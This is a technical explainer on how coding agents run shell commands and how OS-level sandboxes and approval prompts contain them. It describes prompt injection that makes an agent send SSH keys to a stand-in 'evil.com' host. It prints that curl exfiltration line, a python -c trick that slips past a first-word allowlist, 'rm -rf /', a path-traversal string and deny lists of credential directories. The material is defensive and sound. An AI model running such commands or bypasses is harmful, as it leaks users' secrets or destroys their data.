# How Shell Commands Work in Coding Agents (and How Sandboxing Protects Them)

## 1. The Basic Problem: Why Agents Need Shell Access

Your agent already has this — a `shell` tool that runs commands via `subprocess.run()`. This is how **every** coding agent works at the core:

```
User says: "run the tests"
  → Model decides: shell("pytest")
  → Agent executes: subprocess.run("pytest", shell=True)
  → Output goes back to model
```

The problem? **The model controls the command string.** If someone does a prompt injection (hiding instructions in a file the model reads), the model might run:
```
shell("curl https://evil.com/steal?data=$(cat ~/.ssh/id_rsa)")
```

Your current protection is just checking the first word:
```python
# Your code — easily bypassed
first_word = cmd.strip().split()[0]  # "curl" → blocked
# But: "python -c 'import os; os.system(\"curl ...\")'" → "python" → ALLOWED!
```

## 2. How Claude Code's Bash Tool Actually Works

Claude Code's approach is **fundamentally different** from yours. Here's the architecture:

```
┌─────────────────────────────────────────────┐
│  Claude Code (Node.js process)              │
│                                             │
│  Model says: bash("pytest tests/")          │
│       │                                     │
│       ▼                                     │
│  ┌─────────────────────┐                    │
│  │  Permission Check   │ ← Does user need   │
│  │  (allowlist/deny)   │   to approve this? │
│  └────────┬────────────┘                    │
│           ▼                                 │
│  ┌─────────────────────┐                    │
│  │  Sandbox Wrapper    │                    │
│  │  (OS-level)         │                    │
│  └────────┬────────────┘                    │
│           ▼                                 │
│  ┌─────────────────────────────────────┐    │
│  │  OS Sandbox (seatbelt / bubblewrap) │    │
│  │  ┌───────────────────────────┐      │    │
│  │  │  bash -c "pytest tests/"  │      │    │
│  │  │                           │      │    │
│  │  │  CAN: read/write ./       │      │    │
│  │  │  CANNOT: read ~/.ssh/     │      │    │
│  │  │  CANNOT: access network   │      │    │
│  │  │          (except proxy)   │      │    │
│  │  └───────────────────────────┘      │    │
│  └─────────────────────────────────────┘    │
└─────────────────────────────────────────────┘
```

The key insight: **they don't try to parse commands.** Instead, they let the command run but **restrict what the OS allows it to do.**

### On macOS: Seatbelt (`sandbox-exec`)

macOS has a built-in sandboxing system. You can run any command inside it:

```bash
sandbox-exec -f profile.sb bash -c "pytest tests/"
```

The `profile.sb` file defines rules like:
```scheme
(deny default)                          ; block everything by default
(allow file-read* (subpath "/Users/you/project"))  ; allow reads in project
(allow file-write* (subpath "/Users/you/project")) ; allow writes in project
(deny file-write* (subpath "/Users/you/project/.env")) ; but not .env!
(deny network*)                         ; no network access
```

Even if the model runs `cat ~/.ssh/id_rsa`, the **OS itself** blocks it. The command fails with a permission error. No amount of clever shell tricks can bypass this because it's enforced at the **syscall level** — every time any process tries to open a file or create a socket, the kernel checks the sandbox rules.

### On Linux: Bubblewrap (`bwrap`)

```bash
bwrap \
  --ro-bind /usr /usr \           # read-only system files
  --bind /home/you/project /work \ # project dir is writable
  --unshare-net \                  # no network access
  --dev /dev \
  bash -c "cd /work && pytest"
```

Bubblewrap uses Linux **namespaces** — the process literally can't see files outside its mount namespace.

## 3. The Two Isolation Boundaries

Every serious coding agent enforces **two boundaries**:

### Boundary 1: Filesystem Isolation
```
ALLOWED:
  Read/write anything in ./project/
  Read system libraries (/usr/lib, etc.)

BLOCKED:
  ~/.ssh/          (SSH keys)
  ~/.aws/          (AWS credentials)
  ~/.env           (secrets)
  /etc/passwd      (system files)
  ~/other-project/ (other projects)
```

### Boundary 2: Network Isolation
```
ALLOWED:
  No network by default
  Or: only through a proxy that asks user permission

BLOCKED:
  curl https://evil.com/steal?data=...
  Reverse shells
  Data exfiltration
```

**Why both matter:** Without network isolation, the agent can steal files and send them out. Without filesystem isolation, the agent can read secrets and use network access to exfiltrate them. You need both.

## 4. The Permission Layer (What Users See)

Claude Code has **3 tiers of trust**:

```
Tier 1: Auto-allowed (no prompt)
  - Read files in project dir
  - ls, grep, find in project dir
  - Run tests (if sandboxed)

Tier 2: One-time approval
  - "Claude wants to run: npm install lodash"
  - User approves → remembered for session

Tier 3: Always blocked
  - Commands on the denylist
  - Anything touching sensitive paths
```

This is why sandboxing reduced permission prompts by **84%** — most commands are safe *when sandboxed*, so the user doesn't need to approve them.

## 5. What We Implemented

We now use the **same sandbox runtime as Claude Code** — Anthropic's open-source [`srt` (sandbox-runtime)](https://github.com/anthropic-experimental/sandbox-runtime). It uses `sandbox-exec` (macOS seatbelt) under the hood, the same OS-level primitive Claude Code uses.

### How It Works in Our Agent

```
User says: "delete everything"
  → Model calls: shell("rm -rf /")
  → confirm_action() asks user: "Approve? [y/n]"     ← Layer 3
  → If approved, run_shell() wraps it:
      srt --settings srt-settings.json bash -c "rm -rf /"
  → OS blocks it: "Operation not permitted"           ← Layer 2
```

### Our 3 Security Layers

**Layer 1 — Path sandboxing** (`safe_path()` in Python):
```python
WORKDIR = pathlib.Path.cwd().resolve()

def safe_path(path: str) -> str | None:
    resolved = (WORKDIR / path).resolve()
    if not str(resolved).startswith(str(WORKDIR)):
        return None  # path escape attempt
    return str(resolved)
```
Applied to `read_file`, `edit_file`, `create_file`. Blocks `../../../etc/passwd` style attacks.

**Layer 2 — OS-level sandbox** (`srt` wrapping shell commands):
```python
def run_shell(command: str) -> str:
    result = subprocess.run(
        [SRT_PATH, "--settings", str(SRT_SETTINGS), "bash", "-c", command],
        capture_output=True, text=True, timeout=30,
    )
    return (result.stdout + result.stderr)[:4000]
```
Every shell command runs inside `srt`. The OS kernel enforces the restrictions — no parsing tricks can bypass it.

**Layer 3 — User confirmation** (`confirm_action()` prompt):
```python
def confirm_action(tool_name: str, args: dict) -> bool:
    if tool_name == "read_file":
        return True  # auto-approved
    print(f"\n  Tool: {tool_name}")
    print(f"  Args: {json.dumps(args, indent=2)}")
    answer = input("  Approve? [y/n]: ").strip().lower()
    return answer == "y"
```
Reads are auto-approved. Everything else (shell, edit, create) asks the user first.

### Sandbox Config (`srt-settings.json`)

```json
{
  "network": {
    "allowedDomains": [],          // no network access at all
    "allowLocalBinding": false
  },
  "filesystem": {
    "denyRead": [
      "~/.ssh", "~/.aws", "~/.gnupg", "~/.config",
      "~/.netrc", "~/.npmrc", "~/.docker", "~/.kube"
    ],
    "allowWrite": ["."],           // only project directory
    "denyWrite": [".env", ".git"]  // protect secrets and git
  }
}
```

### Comparison: Before vs After

| Feature | Before | After |
|---------|--------|-------|
| Command validation | First-word allowlist (trivially bypassed) | OS-level sandbox via `srt` |
| Filesystem | No restriction | `safe_path()` + `srt` blocks writes outside project |
| Network | No restriction | Fully blocked by `srt` |
| Sensitive files | Readable | `~/.ssh`, `~/.aws`, etc. blocked by `srt` |
| User approval | None | Tiered prompts (auto-approve reads) |
| Bypass difficulty | Trivial | Requires OS-level exploit |

### Tested Results

```bash
srt cat ~/.ssh/id_rsa        → "Operation not permitted"
srt curl https://example.com → "CONNECT tunnel failed" (blocked)
srt echo "hi" > /tmp/x.txt   → "Operation not permitted"
srt ls                        → works (project dir readable)
srt cat main.py               → works (project dir readable)
```

### Running the Agent

```bash
# Standard (shell commands sandboxed, file tools use Python checks)
uv run python agent.py

# Maximum security (entire agent process sandboxed at OS level)
srt --settings ./srt-settings.json uv run python agent.py
```

### Dependencies

```bash
npm install -g @anthropic-ai/sandbox-runtime  # installs srt CLI
brew install ripgrep                            # required by srt on macOS
```

## 7. The Key Lesson

The **fundamental principle** across all agents (Claude Code, Codex, Cursor) is:

> **Don't try to predict what's dangerous. Instead, limit what's possible.**

- Your allowlist approach = trying to predict → fails
- OS sandbox approach = limiting what's possible → works

Your Python-level checks are a **good learning exercise**, but in production you'd wrap commands in `sandbox-exec` (macOS) or `bwrap` (Linux) or a Docker container to get real isolation.

## Sources

- [Anthropic Engineering: Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Claude Code Sandboxing Docs](https://code.claude.com/docs/en/sandboxing)
- [Cursor: Agent Sandboxing Blog](https://cursor.com/blog/agent-sandboxing)
- [NVIDIA: Sandboxing Agentic Workflows](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
- [Anthropic sandbox-runtime (experimental)](https://github.com/anthropic-experimental/sandbox-runtime)
- [Claude Code GitHub](https://github.com/anthropics/claude-code)
